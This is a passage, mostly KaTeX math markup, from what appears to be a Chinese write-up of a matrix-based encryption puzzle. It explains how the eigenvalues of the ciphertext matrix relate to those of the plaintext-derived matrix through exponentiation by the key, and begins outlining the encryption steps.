class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">]</span></span></span></span></span></span></li><li>矩阵 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span> 是标量乘法结果：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mo>⋅</mo><msub><mi>v</mi><mn>1</mn></msub><mtext> </mtext><mi>b</mi><mo>⋅</mo><msub><mi>v</mi><mn>2</mn></msub><mtext> </mtext><mi>c</mi><mo>⋅</mo><msub><mi>v</mi><mn>3</mn></msub><mtext> </mtext><mi>d</mi><mo>⋅</mo><msub><mi>v</mi><mn>4</mn></msub><mtext> </mtext><mn>0</mn><mo>⋅</mo><msub><mi>v</mi><mn>5</mn></msub></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">B = \begin{bmatrix} a \cdot v_1 \ b \cdot v_2 \ c \cdot v_3 \ d \cdot v_4 \ 0 \cdot v_5 \end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">]</span></span></span></span></span></span>，其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">e=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span></li><li>矩阵 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mo>=</mo><msup><mi>A</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>⋅</mo><mi>B</mi></mrow><annotation encoding="application/x-tex">C = A^{-1} \cdot B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span></li><li>矩阵 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi><mo>=</mo><msup><mi>C</mi><mrow><mi>k</mi><mi>e</mi><mi>y</mi></mrow></msup></mrow><annotation encoding="application/x-tex">D = C^{key}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8491079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span></span></span></span></span></span></span></span></span></li></ul><h4 id="2-关键数学关系"><a class="markdownIt-Anchor" href="#2-关键数学关系"></a> 2. <strong>关键数学关系</strong></h4><ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mo>=</mo><msup><mi>A</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>⋅</mo><mtext>diag</mtext><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">,</mo><mi>c</mi><mo separator="true">,</mo><mi>d</mi><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">)</mo><mo>⋅</mo><mi>A</mi></mrow><annotation encoding="application/x-tex">C = A^{-1} \cdot \text{diag}(a, b, c, d, 0) \cdot A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">diag</span></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">c</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">d</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span></span></span></span>，因此 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi></mrow><annotation encoding="application/x-tex">C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span> 的特征值为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">,</mo><mi>c</mi><mo separator="true">,</mo><mi>d</mi><mo separator="true">,</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">{a, b, c, d, 0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">c</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">d</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span></span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi><mo>=</mo><msup><mi>C</mi><mrow><mi>k</mi><mi>e</mi><mi>y</mi></mrow></msup><mo>=</mo><msup><mi>A</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>⋅</mo><mtext>diag</mtext><mo stretchy="false">(</mo><msup><mi>a</mi><mrow><mi>k</mi><mi>e</mi><mi>y</mi></mrow></msup><mo separator="true">,</mo><msup><mi>b</mi><mrow><mi>k</mi><mi>e</mi><mi>y</mi></mrow></msup><mo separator="true">,</mo><msup><mi>c</mi><mrow><mi>k</mi><mi>e</mi><mi>y</mi></mrow></msup><mo separator="true">,</mo><msup><mi>d</mi><mrow><mi>k</mi><mi>e</mi><mi>y</mi></mrow></msup><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">)</mo><mo>⋅</mo><mi>A</mi></mrow><annotation encoding="application/x-tex">D = C^{key} = A^{-1} \cdot \text{diag}(a^{key}, b^{key}, c^{key}, d^{key}, 0) \cdot A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8491079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0991079999999998em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">diag</span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span></span></span></span>，特征值为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mrow><mi>k</mi><mi>e</mi><mi>y</mi></mrow></msup><mo separator="true">,</mo><msup><mi>b</mi><mrow><mi>k</mi><mi>e</mi><mi>y</mi></mrow></msup><mo separator="true">,</mo><msup><mi>c</mi><mrow><mi>k</mi><mi>e</mi><mi>y</mi></mrow></msup><mo separator="true">,</mo><msup><mi>d</mi><mrow><mi>k</mi><mi>e</mi><mi>y</mi></mrow></msup><mo separator="true">,</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">{a^{key}, b^{key}, c^{key}, d^{key}, 0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.043548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span></span></span></span></span></li><li><strong>核心洞察</strong>：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi></mrow><annotation encoding="application/x-tex">C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi></mrow><annotation encoding="application/x-tex">D</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span></span></span></span> 的特征值存在指数关系：<ul><li>非零特征值满足 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>d</mi><mi>i</mi></msub><mo>=</mo><msubsup><mi>c</mi><mi>i</mi><mrow><mi>k</mi><mi>e</mi><mi>y</mi></mrow></msubsup><mspace></mspace><mspace width="0.6666666666666666em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">d_i = c_i^{key} \mod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.2438799999999999em;vertical-align:-0.276864em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9670159999999999em;"><span style="top:-2.4231360000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.1809080000000005em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.276864em;"><span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6666666666666666em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span> 特征值直接对应</li></ul></li></ul><h4 id="3-加密流程"><a class="markdownIt-Anchor" href="#3-加密流程"></a> 3. <strong>加密流程</strong></h4><ol><li>生成随机密钥 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mi>e</mi><mi>y</mi><mo>∈</mo><mo stretchy="false">[</mo><msup><mn>2</mn><mn>62</mn></msup><mo separator="true">,</mo><mi>p</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">key \in [2^{62}, p]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mclose">]</span></span></span></span></li><li>使用 PKCS#7 填充将 <span class="katex"><span class="katex-mathml"><math 